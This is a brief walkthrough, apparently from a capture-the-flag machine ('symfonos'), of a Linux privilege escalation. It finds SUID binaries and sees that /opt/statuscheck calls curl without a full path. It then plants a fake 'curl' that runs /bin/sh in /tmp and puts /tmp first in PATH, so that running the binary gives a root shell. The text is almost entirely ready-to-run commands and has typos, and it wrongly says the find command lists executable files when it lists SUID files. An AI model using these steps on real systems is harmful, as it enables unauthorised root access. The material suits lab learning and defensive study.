
Locate files that the current user can execute:
```
find / -perm -4000 2>/dev/null
```

If Found a command that seems out of place, e.g.:
/opt/statuscheck
run it and see what it does.

Next lets check out the file type:
```
file /opt/statuscheck
```

Now lets check the embedded string in it:
```
strings /opt/statuscheck
```

If you find something like the curl command and somthing like http://lh
This suggets that the curl command makes use HTTP requests.
We can exploit this to run a malicious curl command:
Navigate to the TMP directory
Now we create a file that will execute /bin/sh when executed:
```
helios@symfonos:/home/helios$ cd /tmp
cd /tmp
helios@symfonos:/tmp$ echo "/bin/sh" > curl
```

Change the permission to make is executable:
```
chmod 777 curl
```

Now we ensure that the tmp directory is priorisise when running the command, so we amend it to the PATH variable
```
export PATH=/tmp:$PATH
```

Now execute the /opt/statuscheck file, this should spawn a root shell now.

You can check by running:
```
whoami
id
```

